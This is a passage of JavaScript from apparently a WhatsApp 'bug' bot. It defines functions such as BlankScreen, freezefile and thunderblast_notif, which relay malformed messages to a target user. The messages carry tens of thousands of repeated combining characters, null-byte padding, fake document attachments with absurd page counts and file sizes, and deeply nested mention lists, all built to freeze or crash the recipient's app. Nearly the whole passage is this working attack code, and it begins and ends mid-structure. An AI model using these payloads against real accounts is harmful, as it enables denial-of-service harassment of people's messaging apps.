⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            mentionedJid: Array.from({ length: 9 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            groupMentions: [
                                {
                                    groupJid: "1@newsletter", 
                                    groupSubject: "UNDEFINED",  
                                    groupMetadata: {
                                        creationTimestamp: 1715880173,  
                                        ownerJid: "owner@newsletter",  
                                        adminJids: ["admin@newsletter", "developer@newsletter"], 
                                    }
                                }
                            ],
                            externalContextInfo: {
                                customTag: "SECURE_PAYBUG_MESSAGE",  
                                securityLevel: "HIGH",  
                                referenceCode: "PAYBUG10291",  
                                timestamp: new Date().toISOString(),  
                                messageId: "MSG00123456789",  
                                userId: "UNDEFINED"  
                            },
                            mentionedJid: Array.from({ length: 9 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "9@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 8 }, () => "8@newsletter"),
                            groupMentions: [{ groupJid: "8@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 7 }, () => "7@newsletter"),
                            groupMentions: [{ groupJid: "7@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 6 }, () => "6@newsletter"),
                            groupMentions: [{ groupJid: "6@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 4 }, () => "4@newsletter"),
                            groupMentions: [{ groupJid: "4@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 3 }, () => "3@newsletter"),
                            groupMentions: [{ groupJid: "3@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2 }, () => "2@newsletter"),
                            groupMentions: [{ groupJid: "2@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 1 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    AndraZyy.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}
 async function BlankScreen(target, Ptcp = false) {
let virtex = "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
			await AndraZyy.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Hayolo",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://files.catbox.moe/ia8je8.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://files.catbox.moe/ia8je8.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log(chalk.red.bold('🔥 𝐉𝐮𝐢𝐜𝐞 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠'))
   	};
async function freezefile(target, QBug, Ptcp = true) {
    let virtex = "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄" + "ြ".repeat(25000);
    await AndraZyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "NtahMengapa..",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function thunderblast_notif(target) {
			await AndraZyy.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0000",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: 'https://files.catbox.moe/ia8je8.jpg',
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷݉